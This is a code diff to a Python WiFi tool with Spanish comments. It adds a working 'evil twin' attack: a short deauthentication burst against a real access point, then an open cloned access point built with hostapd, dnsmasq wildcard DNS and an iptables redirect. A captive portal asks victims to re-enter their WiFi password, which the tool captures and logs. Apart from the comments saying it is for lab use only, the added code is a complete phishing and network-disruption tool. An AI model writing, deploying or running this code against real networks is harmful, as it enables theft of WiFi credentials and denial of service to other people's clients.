@@ -5,6 +5,7 @@ ya unmanaged en NetworkManager). Salida JSON, mismo patron que
 wifi_scan.py / db_tool.py.
 """
 import sys, os, re, json, subprocess, time, tempfile, glob
+import threading, http.server, socketserver, urllib.parse
 
 def _run(cmd, timeout=10):
     try:
@@ -459,6 +460,180 @@ def beacon_flood(iface, channel=6, seconds=20, pps=80, realistic=True):
             "detail": out[-400:]}, None
 
 
+# ───────────────────────── Evil Twin (AP falso + portal cautivo) ─────────────
+# SOLO laboratorio / redes propias. Levanta un AP ABIERTO con el MISMO nombre
+# que la red objetivo; el dispositivo victima se conecta y recibe un portal
+# cautivo ("reingrese su clave WiFi"); la clave enviada se captura. Un solo
+# adaptador (wlan1): primero un deauth corto para empujar al cliente, luego el
+# gemelo. El portal corre en :8080 (no-root) y se redirige el :80 con iptables.
+_ET_STATE = {"ssid": None, "password": None}
+_ET_EVENT = threading.Event()
+
+class _ETPortalHandler(http.server.BaseHTTPRequestHandler):
+    def log_message(self, *a):
+        pass  # no ensuciar stdout (romperia el JSON del contrato)
+
+    def _send_portal(self):
+        ssid = _ET_STATE.get("ssid") or "su red WiFi"
+        html = ("<!doctype html><html><head><meta charset='utf-8'>"
+                "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+                "<title>Actualizacion de red</title></head>"
+                "<body style='font-family:sans-serif;max-width:420px;margin:40px auto;padding:0 16px'>"
+                "<h2>Reconexion requerida</h2>"
+                f"<p>Su router <b>{ssid}</b> requiere reingresar la contrasena "
+                "WiFi para continuar con la conexion.</p>"
+                "<form method='POST' action='/'>"
+                "<input type='password' name='password' placeholder='Contrasena WiFi' "
+                "style='width:100%;padding:12px;font-size:16px;box-sizing:border-box' required>"
+                "<button type='submit' style='width:100%;padding:12px;font-size:16px;"
+                "margin-top:12px'>Conectar</button></form>"
+                "<p style='color:#888;font-size:12px;margin-top:24px'>Prueba de laboratorio.</p>"
+                "</body></html>")
+        data = html.encode("utf-8")
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(data)))
+        self.end_headers()
+        self.wfile.write(data)
+
+    def do_GET(self):
+        # Captive portal: cualquier URL devuelve el portal (y responde a los
+        # chequeos de conectividad de Android/iOS para disparar el "iniciar sesion").
+        self._send_portal()
+
+    def do_POST(self):
+        try:
+            length = int(self.headers.get("Content-Length", 0))
+            body = self.rfile.read(length).decode("utf-8", "replace")
+            params = urllib.parse.parse_qs(body)
+            pw = (params.get("password") or [""])[0].strip()
+        except Exception:
+            pw = ""
+        if pw:
+            _ET_STATE["password"] = pw
+            _ET_EVENT.set()
+        msg = ("<!doctype html><html><head><meta charset='utf-8'></head>"
+               "<body style='font-family:sans-serif;text-align:center;margin-top:60px'>"
+               "<h3>Gracias. Reconectando...</h3></body></html>").encode("utf-8")
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(msg)))
+        self.end_headers()
+        self.wfile.write(msg)
+
+def _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd):
+    """Baja todo el Evil Twin y restaura wlan1 a managed. Best-effort."""
+    try:
+        if httpd:
+            httpd.shutdown()
+            httpd.server_close()
+    except Exception:
+        pass
+    # iptables: quitar el redirect 80->8080
+    _run(['sudo', '/usr/sbin/iptables', '-t', 'nat', '-D', 'PREROUTING',
+          '-i', iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT',
+          '--to-ports', '8080'])
+    for p in procs:
+        try:
+            p.terminate()
+        except Exception:
+            pass
+    # por si quedaron colgados
+    _run(['sudo', '/usr/bin/pkill', '-f', 'hostapd'])
+    _run(['sudo', '/usr/bin/pkill', '-f', 'dnsmasq'])
+    _run(['sudo', '/usr/bin/ip', 'addr', 'flush', 'dev', iface])
+    for f in (hostapd_conf, dnsmasq_conf):
+        try:
+            if f and os.path.exists(f):
+                os.remove(f)
+        except Exception:
+            pass
+    disable_monitor(iface)   # vuelve a managed + up
+
+def evil_twin(iface, ssid, bssid, channel, seconds=120):
+    """Evil Twin con portal cautivo. Devuelve (data, err). data trae
+    'password' (capturada o None) y 'clients'. SOLO laboratorio."""
+    # Canal del gemelo: hostapd abierto en 2.4 (hw_mode=g) es lo mas fiable;
+    # si el objetivo es 5GHz usamos canal 6 (lo que importa es el NOMBRE).
+    try:
+        ch = int(channel)
+    except (ValueError, TypeError):
+        ch = 6
+    if ch < 1 or ch > 13:
+        ch = 6
+
+    _ET_STATE["ssid"] = ssid
+    _ET_STATE["password"] = None
+    _ET_EVENT.clear()
+
+    # 1) Empujon: deauth corto al AP real para que el cliente se suelte y busque
+    #    el SSID (un solo adaptador, por eso secuencial: deauth -> luego AP).
+    if bssid:
+        try:
+            deauth(bssid, ch, 15, iface, duration=0)  # rafaga corta
+        except Exception:
+            pass
+
+    # 2) Dejar wlan1 en managed/up y asignarle la IP de gateway del AP.
+    disable_monitor(iface)
+    _run(['sudo', '/usr/bin/ip', 'addr', 'flush', 'dev', iface])
+
+    hostapd_conf = None
+    dnsmasq_conf = None
+    procs = []
+    httpd = None
+    try:
+        # hostapd (AP abierto con el nombre objetivo)
+        hf = tempfile.NamedTemporaryFile(mode='w', prefix='piscan_et_hostapd_',
+                                         suffix='.conf', delete=False)
+        hf.write(f"interface={iface}\ndriver=nl80211\nssid={ssid}\n"
+                 f"hw_mode=g\nchannel={ch}\n")
+        hf.close()
+        hostapd_conf = hf.name
+        procs.append(subprocess.Popen(['sudo', '/usr/sbin/hostapd', hostapd_conf],
+                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+        time.sleep(4)  # que levante el AP
+        if procs[-1].poll() is not None:
+            _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd)
+            return None, "hostapd no pudo levantar el AP (ver dmesg)"
+
+        # IP de gateway en wlan1 (hostapd ya la dejo en modo AP)
+        _run(['sudo', '/usr/bin/ip', 'addr', 'add', '10.0.0.1/24', 'dev', iface])
+
+        # dnsmasq (DHCP + DNS wildcard -> todo al portal)
+        df = tempfile.NamedTemporaryFile(mode='w', prefix='piscan_et_dnsmasq_',
+                                         suffix='.conf', delete=False)
+        df.write(f"interface={iface}\nbind-interfaces\nlisten-address=10.0.0.1\n"
+                 "dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h\n"
+                 "dhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\n"
+                 "no-resolv\naddress=/#/10.0.0.1\n")
+        df.close()
+        dnsmasq_conf = df.name
+        procs.append(subprocess.Popen(['sudo', '/usr/sbin/dnsmasq', '-C', dnsmasq_conf, '-d'],
+                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
+
+        # redirigir el :80 al portal (:8080, no-root)
+        _run(['sudo', '/usr/sbin/iptables', '-t', 'nat', '-A', 'PREROUTING',
+              '-i', iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT',
+              '--to-ports', '8080'])
+
+        # portal cautivo en :8080
+        socketserver.TCPServer.allow_reuse_address = True
+        httpd = socketserver.TCPServer(("0.0.0.0", 8080), _ETPortalHandler)
+        t = threading.Thread(target=httpd.serve_forever, daemon=True)
+        t.start()
+
+        # 3) Esperar hasta capturar la clave o agotar el tiempo
+        _ET_EVENT.wait(timeout=max(10, int(seconds)))
+
+    finally:
+        _et_teardown(iface, procs, hostapd_conf, dnsmasq_conf, httpd)
+
+    pw = _ET_STATE.get("password")
+    return {"ssid": ssid, "channel": ch, "password": pw,
+            "captured": bool(pw)}, None
+
+
 # OUI -> fabricante. Los primeros 3 bytes del MAC identifican al fabricante.
 # Preferimos una base del sistema si existe (completa); si no, un fallback chico.
 _OUI_BUILTIN = {
@@ -837,6 +1012,27 @@ def main():
         else:
             log_attack("beacon", "", "done",
                        details=f"ch={data['channel']} {data['seconds']}s {data['pps']}pps")
+            out = {"ok": True}
+            out.update(data)
+            print(json.dumps(out))
+    elif cmd == 'evil_twin':
+        if len(sys.argv) < 4:
+            print(json.dumps({"ok": False, "error": "uso: wifi_ops.py evil_twin <ssid> <bssid> <channel> [segundos] [iface]"}))
+            sys.exit(1)
+        ssid = sys.argv[2]
+        bssid = sys.argv[3]
+        channel = int(sys.argv[4]) if len(sys.argv) > 4 else 6
+        seconds = int(sys.argv[5]) if len(sys.argv) > 5 else 120
+        iface_et = sys.argv[6] if len(sys.argv) > 6 else 'wlan1'
+        data, err = evil_twin(iface_et, ssid, bssid, channel, seconds)
+        if err:
+            log_attack("evil_twin", bssid, "fail", target_ssid=ssid, details=err)
+            print(json.dumps({"ok": False, "error": err, "mode": get_status(iface_et)}))
+        else:
+            got = data["captured"]
+            log_attack("evil_twin", bssid, "captured" if got else "nada",
+                       target_ssid=ssid,
+                       details=(f"pass={data['password']}" if got else "sin captura"))
             out = {"ok": True}
             out.update(data)
             print(json.dumps(out))
